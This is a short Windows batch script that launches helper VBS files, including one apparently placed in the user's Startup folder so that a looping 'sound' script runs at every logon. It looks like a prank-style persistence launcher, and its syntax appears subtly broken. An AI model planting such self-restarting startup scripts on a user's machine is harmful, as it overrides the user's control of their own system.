@echo off

if exist %TEMP%\sound.vbs( 
  start %~dp0copy.vbs
  timeout 1
  start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\loop.vbs
  
)
if not exist %TEMP%\sound.vbs start %~dp0ZZCreateSound.vbs